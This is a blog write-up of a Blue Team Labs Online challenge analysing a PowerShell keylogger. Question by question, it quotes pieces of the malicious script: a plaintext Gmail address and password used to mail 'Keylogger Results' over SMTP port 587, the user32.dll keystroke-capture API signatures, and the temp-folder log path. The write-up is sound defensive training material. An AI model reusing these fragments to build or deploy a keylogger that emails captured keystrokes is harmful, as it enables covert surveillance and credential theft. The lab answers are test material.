---
layout: post
title: PowerShell Analysis - Keylogger
date: '2023-10-08 20:23:20 +0300'
image: /assets/img/cover_images/3.png
categories: [BTLO, Reverse Engineering]
tags: [BTLO, Text Editor]
---

## PowerShell Analysis - Keylogger
A suspicious PowerShell script was found on one of our endpoints. Can you work out what it does? 

##  What is the SHA256 hash value for the PowerShell script file? (1 points) 

```bash
❯ sha256sum HDWallpaperEngine.txt
e0b7a2ad2320ac32c262aeb6fe2c6c0d75449c6e34d0d18a531157c827b9754e
```

##  What email address is used to send and receive emails? (1 points) 
```bash
$From = "chaudhariparth454@gmail.com"
$Pass = "yjghfdafsd5464562!"
$To = "chaudhariparth454@gmail.com"
$Subject = "Keylogger Results"
```

##  What is the password for this email account? (2 points) 

```bash
$Pass = "yjghfdafsd5464562!"
```

##  What port is used for SMTP? (2 points) 

```bash
$SMTPPort = "587"
```

##  What DLL is imported to help record keystrokes? (2 points) 

```bash
#requires -Version 2
function Start-KeyLogger($Path="$env:temp\keylogger.txt") 
{
  # Signatures for API Calls
  $signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
```
##  What directory is the generated txt file put in? (2 points) 

```bash
#requires -Version 2
function Start-KeyLogger($Path="$env:temp\keylogger.txt") 
```